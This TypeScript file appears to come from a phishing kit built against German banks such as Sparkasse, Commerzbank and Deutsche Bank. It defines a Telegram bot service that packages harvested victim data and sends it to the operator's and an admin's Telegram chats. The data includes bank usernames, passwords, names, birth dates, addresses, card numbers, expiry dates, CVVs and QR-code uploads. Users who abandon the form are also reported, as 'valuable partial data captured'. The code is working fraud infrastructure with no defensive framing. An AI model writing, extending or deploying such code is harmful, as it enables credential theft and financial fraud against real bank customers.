import TelegramBot from 'node-telegram-bot-api';
import { getDb } from '../database';
import { getTelegramSettings } from '../database/tables/telegram_settings';

interface LeadWithTemplate {
  id: number;
  template_id: number;
  domain_id: number;
  tracking_id: string | null;
  name: string | null;
  email: string | null;
  phone: string | null;
  username: string | null;
  password: string | null;
  additional_data: string;
  ip_address: string | null;
  user_agent: string | null;
  status: string;
  created_at: string;
  template_name: string;
  template_display_name: string;
  domain_name: string;
}

class TelegramNotificationService {
  private bot: TelegramBot | null = null;
  private isInitialized: boolean = false;
  private initializationError: string | null = null;

  /**
   * Initialize the Telegram bot with settings from database
   */
  async initialize(): Promise<void> {
    try {
      const db = getDb();
      const settings = getTelegramSettings(db);
      
      if (!settings || !settings.bot_token) {
        this.initializationError = 'No bot token configured';
        console.warn('⚠️ Telegram bot not initialized: No bot token configured');
        return;
      }

      // Create bot instance
      this.bot = new TelegramBot(settings.bot_token, { 
        polling: false // We don't need polling for notifications
      });

      // Test bot connection
      try {
        const botInfo = await this.bot.getMe();
        console.log(`✅ Telegram bot initialized: @${botInfo.username}`);
        this.isInitialized = true;
        this.initializationError = null;
      } catch (error) {
        this.initializationError = `Bot token invalid: ${error.message}`;
        console.error('❌ Telegram bot initialization failed:', error.message);
        this.bot = null;
      }
    } catch (error) {
      this.initializationError = `Database error: ${error.message}`;
      console.error('❌ Error initializing Telegram service:', error);
    }
  }

  /**
   * Send partial lead notification to Telegram
   */
  async sendPartialLeadNotification(lead: any): Promise<boolean> {
    try {
      if (!this.isInitialized || !this.bot) {
        console.warn('⚠️ Telegram bot not initialized, skipping partial lead notification');
        return false;
      }

      const db = getDb();
      const settings = getTelegramSettings(db);
      
      if (!settings || !settings.notifications_enabled || !settings.chat_id) {
        console.warn('⚠️ Telegram notifications disabled or no chat ID configured');
        return false;
      }

      // Format the partial lead notification message
      const message = this.formatPartialLeadMessage(lead);
      
      // Send to main chat
      await this.bot.sendMessage(settings.chat_id, message, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      });

      // Send to admin chat if configured
      if (settings.admin_chat_id && settings.admin_chat_id !== settings.chat_id) {
        await this.bot.sendMessage(settings.admin_chat_id, message, {
          parse_mode: 'Markdown',
          disable_web_page_preview: true
        });
      }

      console.log(`✅ Partial lead Telegram notification sent for lead ${lead.id}`);
      return true;
    } catch (error) {
      console.error('❌ Error sending partial lead Telegram notification:', error);
      return false;
    }
  }

  /**
   * Format partial lead message for Telegram
   */
  private formatPartialLeadMessage(lead: any): string {
    const bankEmoji = this.getBankEmoji(lead.template_name);
    
    return `
🚨 **PARTIAL LEAD ALERT** 🚨

${bankEmoji} **${lead.template_display_name}**
📊 **Lead ID:** ${lead.id}
⚠️ **Status:** Abandoned (${lead.abandonment_point})

👤 **User Data:**
• Username: \`${lead.username}\`
• Email: ${lead.email}
• Phone: ${lead.phone}

📈 **Session Info:**
• Duration: ${Math.floor(lead.session_duration / 60)}m ${lead.session_duration % 60}s
• Completeness: ${lead.data_completeness}%
• Abandoned at: ${lead.abandonment_point.replace(/_/g, ' ')}

⏰ **Time:** ${new Date().toLocaleString('de-DE')}

*User started but didn't complete - valuable partial data captured!*
    `.trim();
  }

  /**
   * Send notification for new lead
   */
  async sendLeadNotification(leadData: LeadWithTemplate): Promise<boolean> {
    try {
      if (!this.isInitialized || !this.bot) {
        console.warn('⚠️ Telegram bot not initialized, skipping notification');
        return false;
      }

      const db = getDb();
      const settings = getTelegramSettings(db);
      
      if (!settings || !settings.notifications_enabled || !settings.chat_id) {
        console.warn('⚠️ Telegram notifications disabled or no chat ID configured');
        return false;
      }

      // Format the notification message
      const message = await this.formatLeadMessage(leadData);
      
      // Send to main chat
      await this.bot.sendMessage(settings.chat_id, message, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      });

      // Send to admin chat if configured
      if (settings.admin_chat_id && settings.admin_chat_id !== settings.chat_id) {
        await this.bot.sendMessage(settings.admin_chat_id, message, {
          parse_mode: 'Markdown',
          disable_web_page_preview: true
        });
      }

      console.log(`✅ Telegram notification sent for lead ${leadData.id}`);
      return true;
    } catch (error) {
      console.error('❌ Error sending Telegram notification:', error);
      return false;
    }
  }

  /**
   * Format lead data into rich Telegram message
   */
  private async formatLeadMessage(leadData: LeadWithTemplate): Promise<string> {
    const bankEmoji = this.getBankEmoji(leadData.template_name);
    const bankName = leadData.template_display_name.toUpperCase();
    
    // Parse additional data
    let additionalData: any = {};
    try {
      additionalData = JSON.parse(leadData.additional_data || '{}');
    } catch (error) {
      console.warn('Failed to parse additional_data:', error);
    }

    const sessionKey = additionalData.session_key || leadData.tracking_id || `lead-${leadData.id}`;
    const timestamp = new Date(leadData.created_at).toLocaleString('de-DE');
    
    let message = `${bankEmoji} **NEUE DATENSAMMLUNG - ${bankName}**\n\n`;
    message += `🔑 **Session:** \`${sessionKey}\`\n`;
    message += `📅 **Zeit:** ${timestamp}\n`;
    message += `🌐 **IP:** ${leadData.ip_address || 'Unbekannt'}\n`;
    message += `🖥️ **Browser:** ${this.formatUserAgent(leadData.user_agent)}\n`;
    message += `🌍 **Domain:** ${leadData.domain_name}\n`;

    const selectedBankName = additionalData.selected_bank_name || additionalData.selected_bank || additionalData.bank_type;
    const selectedBankDescription = additionalData.selected_bank_description;
    if (selectedBankName) {
      const bankLine = selectedBankDescription
        ? `${selectedBankName} (${selectedBankDescription})`
        : selectedBankName;
      message += `🏦 **Bank:** ${bankLine}\n`;
    }

    message += `\n`;

    // Branch selection (for Sparkasse/Volksbank and any templates that store selected_branch)
    if (additionalData.selected_branch || additionalData.selectedBranch || additionalData.branchData) {
      const branch = additionalData.selected_branch || additionalData.selectedBranch || additionalData.branchData;
      message += `🏢 **FILIALE:**\n`;
      message += `• ${branch.branch_name || 'Unbekannt'}\n`;
      message += `• ${branch.city || 'Unbekannt'}, ${branch.zip_code || 'Unbekannt'}\n\n`;
    }

    // Login data
    message += `🔐 **LOGIN-DATEN:**\n`;
    if (additionalData.login_data) {
      message += `• Benutzername: \`${additionalData.login_data.username || leadData.username || 'N/A'}\`\n`;
      message += `• Passwort: \`${additionalData.login_data.password || leadData.password || 'N/A'}\`\n`;
    } else {
      message += `• Benutzername: \`${leadData.username || 'N/A'}\`\n`;
      message += `• Passwort: \`${leadData.password || 'N/A'}\`\n`;
    }
    
    // Login attempts
    if (additionalData.login_attempts && additionalData.login_attempts.length > 0) {
      message += `• Versuche: ${additionalData.login_attempts.length}\n`;
    }
    message += `\n`;

    // Personal data
    if (additionalData.personal_data || leadData.name) {
      message += `👤 **PERSÖNLICHE DATEN:**\n`;
      const personalData = additionalData.personal_data || {};
      message += `• Name: \`${leadData.name || `${personalData.first_name || ''} ${personalData.last_name || ''}`.trim() || 'N/A'}\`\n`;
      if (personalData.date_of_birth) {
        message += `• Geburt: \`${personalData.date_of_birth}\`\n`;
      }
      if (personalData.street && personalData.street_number) {
        message += `• Adresse: \`${personalData.street} ${personalData.street_number}, ${personalData.plz || ''} ${personalData.city || ''}\`\n`;
      } else if (personalData.address) {
        message += `• Adresse: \`${personalData.address}\`\n`;
      }
      if (leadData.phone || personalData.phone) {
        message += `• Telefon: \`${leadData.phone || personalData.phone}\`\n`;
      }
      if (leadData.email || personalData.email) {
        message += `• E-Mail: \`${leadData.email || personalData.email}\`\n`;
      }
      message += `\n`;
    }

    // Bank card data
    if (additionalData.bank_card) {
      message += `💳 **BANKKARTE:**\n`;
      const bankCard = additionalData.bank_card;
      message += `• Nummer: \`${this.maskCardNumber(bankCard.card_number)}\`\n`;
      if (bankCard.expiry_date) {
        message += `• Ablauf: \`${bankCard.expiry_date}\`\n`;
      }
      if (bankCard.cvv) {
        message += `• CVV: \`${bankCard.cvv}\`\n`;
      }
      if (bankCard.cardholder_name) {
        message += `• Inhaber: \`${bankCard.cardholder_name}\`\n`;
      }
      message += `\n`;
    }

    // QR data (if applicable)
    if (additionalData.qr_data && additionalData.qr_data.files && additionalData.qr_data.files.length > 0) {
      message += `📱 **QR-CODE:**\n`;
      message += `• Uploads: ${additionalData.qr_data.files.length}\n`;
      message += `• Versuche: ${additionalData.qr_data.upload_attempts || 1}\n\n`;
    }

    // Status and admin link
    message += `✅ **STATUS:** ${additionalData.flow_completed ? 'Vollständig abgeschlossen' : 'Datensammlung läuft'}\n`;
    message += `🔗 **Admin:** ${process.env.FRONTEND_URL || 'http://localhost:5173'}/admin/leads/${leadData.id}`;

    return message;
  }

  /**
   * Get bank-specific emoji
   */
  private getBankEmoji(templateName: string): string {
    const bankEmojis: Record<string, string> = {
      'sparkasse': '🏦',
      'commerzbank': '🟡',
      'deutsche_bank': '🔵',
      'postbank': '🟨',
      'santander': '🔴',
      'ingdiba': '🟠',
      'dkb': '🔷',
      'volksbank': '🏛️',
      'comdirect': '💗',
      'consorsbank': '📊',
      'apobank': '🏥',
      'targobank': '💙'
    };
    
    return bankEmojis[templateName] || '🏦';
  }

  /**
   * Format user agent for display
   */
  private formatUserAgent(userAgent: string | null): string {
    if (!userAgent) return 'Unbekannt';
    
    // Extract browser name and version
    const browserMatch = userAgent.match(/(Chrome|Firefox|Safari|Edge)\/([0-9.]+)/);
    if (browserMatch) {
      return `${browserMatch[1]} ${browserMatch[2]}`;
    }
    
    // Fallback to first 50 characters
    return userAgent.length > 50 ? userAgent.substring(0, 50) + '...' : userAgent;
  }


  /**
   * Mask card number for security
   */
  private maskCardNumber(cardNumber: string | null): string {
    if (!cardNumber) return 'N/A';
    
    // Remove spaces and format as XXXX XXXX XXXX XXXX
    const cleaned = cardNumber.replace(/\s/g, '');
    if (cleaned.length >= 13) {
      const masked = cleaned.substring(0, 4) + ' ' + 
                   cleaned.substring(4, 6) + '** **** ' + 
                   cleaned.substring(cleaned.length - 4);
      return masked;
    }
    
    return cardNumber;
  }

  /**
   * Send test notification
   */
  async sendTestNotification(chatId: string): Promise<boolean> {
    try {
      if (!this.bot) {
        await this.initialize();
      }

      if (!this.bot) {
        throw new Error(this.initializationError || 'Bot not initialized');
      }

      const testMessage = `🧪 **TEST NOTIFICATION**\n\n` +
                         `✅ BankingSuite Telegram Bot ist korrekt konfiguriert!\n` +
                         `📅 Test-Zeit: ${new Date().toLocaleString('de-DE')}\n` +
                         `🔗 Admin Dashboard: ${process.env.FRONTEND_URL || 'http://localhost:5173'}/admin`;

      await this.bot.sendMessage(chatId, testMessage, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      });

      console.log(`✅ Test notification sent to chat ${chatId}`);
      return true;
    } catch (error) {
      console.error('❌ Error sending test notification:', error);
      throw error;
    }
  }

  /**
   * Validate bot token
   */
  async validateBotToken(token: string): Promise<boolean> {
    try {
      const testBot = new TelegramBot(token, { polling: false });
      await testBot.getMe();
      return true;
    } catch (error) {
      console.error('❌ Invalid bot token:', error.message);
      return false;
    }
  }

  /**
   * Validate chat ID
   */
  async validateChatId(chatId: string, botToken: string): Promise<boolean> {
    try {
      const testBot = new TelegramBot(botToken, { polling: false });
      await testBot.getChat(chatId);
      return true;
    } catch (error) {
      console.error('❌ Invalid chat ID:', error.message);
      return false;
    }
  }

  /**
   * Get bot status
   */
  async getBotStatus(): Promise<{ connected: boolean; username?: string; error?: string }> {
    try {
      if (!this.bot) {
        await this.initialize();
      }

      if (!this.bot) {
        return { connected: false, error: this.initializationError || 'Bot not initialized' };
      }

      const botInfo = await this.bot.getMe();
      return { connected: true, username: botInfo.username };
    } catch (error) {
      return { connected: false, error: error.message };
    }
  }

  /**
   * Reinitialize bot (useful after settings change)
   */
  async reinitialize(): Promise<void> {
    this.bot = null;
    this.isInitialized = false;
    this.initializationError = null;
    await this.initialize();
  }

  /**
   * Get bot information and discover chat IDs
   */
  async discoverChatIds(botToken: string): Promise<{
    botInfo: any;
    adminChatId?: string;
    groupChatIds?: string[];
    error?: string;
  }> {
    try {
      // Create temporary bot for discovery
      const tempBot = new TelegramBot(botToken, { polling: false });
      
      // Get bot info first
      const botInfo = await tempBot.getMe();
      
      // Start polling to listen for messages
      tempBot.startPolling();
      
      const discoveredChats = {
        adminChatId: undefined as string | undefined,
        groupChatIds: [] as string[]
      };
      
      // Set up message handler for chat ID discovery
      const messageHandler = (msg: any) => {
        const chatId = msg.chat.id.toString();
        const chatType = msg.chat.type;
        
        console.log(`📱 Discovered chat: ${chatId} (${chatType})`);
        
        if (chatType === 'private') {
          // Private chat - potential admin
          discoveredChats.adminChatId = chatId;
          tempBot.sendMessage(chatId, 
            `✅ *BankingSuite Bot Setup*\n\n` +
            `Ihr Admin Chat ID: \`${chatId}\`\n\n` +
            `Diese Chat ID wurde automatisch erkannt. Sie können sie jetzt in den Einstellungen verwenden.`,
            { parse_mode: 'Markdown' }
          );
        } else if (chatType === 'group' || chatType === 'supergroup') {
          // Group chat
          if (!discoveredChats.groupChatIds.includes(chatId)) {
            discoveredChats.groupChatIds.push(chatId);
            tempBot.sendMessage(chatId,
              `✅ *BankingSuite Bot Setup*\n\n` +
              `Gruppen Chat ID: \`${chatId}\`\n\n` +
              `Diese Gruppen-ID wurde automatisch erkannt. Sie können sie jetzt in den Einstellungen verwenden.`,
              { parse_mode: 'Markdown' }
            );
          }
        }
      };
      
      tempBot.on('message', messageHandler);
      
      // Return bot info immediately, chat IDs will be discovered when messages arrive
      return {
        botInfo: {
          id: botInfo.id,
          username: botInfo.username,
          first_name: botInfo.first_name,
          can_join_groups: botInfo.can_join_groups,
          can_read_all_group_messages: botInfo.can_read_all_group_messages
        },
        adminChatId: discoveredChats.adminChatId,
        groupChatIds: discoveredChats.groupChatIds
      };
      
    } catch (error) {
      console.error('❌ Error discovering chat IDs:', error);
      return {
        botInfo: null,
        error: error.message
      };
    }
  }

  /**
   * Get recent chat updates to discover chat IDs
   */
  async getRecentChats(botToken: string): Promise<{
    adminChats: Array<{ id: string; name: string; username?: string }>;
    groupChats: Array<{ id: string; title: string; member_count?: number }>;
    error?: string;
  }> {
    try {
      const tempBot = new TelegramBot(botToken, { polling: false });
      
      // Get recent updates
      const updates = await tempBot.getUpdates({ limit: 100 });
      
      const adminChats = new Map();
      const groupChats = new Map();
      
      // Process updates to find chats
      for (const update of updates) {
        if (update.message) {
          const chat = update.message.chat;
          const chatId = chat.id.toString();
          
          if (chat.type === 'private') {
            adminChats.set(chatId, {
              id: chatId,
              name: `${chat.first_name || ''} ${chat.last_name || ''}`.trim(),
              username: chat.username
            });
          } else if (chat.type === 'group' || chat.type === 'supergroup') {
            groupChats.set(chatId, {
              id: chatId,
              title: chat.title,
              member_count: chat.all_members_are_administrators ? 'Admin Group' : 'Unknown'
            });
          }
        }
      }
      
      return {
        adminChats: Array.from(adminChats.values()),
        groupChats: Array.from(groupChats.values())
      };
      
    } catch (error) {
      console.error('❌ Error getting recent chats:', error);
      return {
        adminChats: [],
        groupChats: [],
        error: error.message
      };
    }
  }
}

// Export singleton instance
export const telegramService = new TelegramNotificationService();

// Auto-initialize after a delay to ensure database is ready
setTimeout(() => {
  telegramService.initialize().catch(error => {
    console.warn('⚠️ Telegram service auto-initialization failed:', error);
  });
}, 1000); // 1 second delay

export default telegramService;
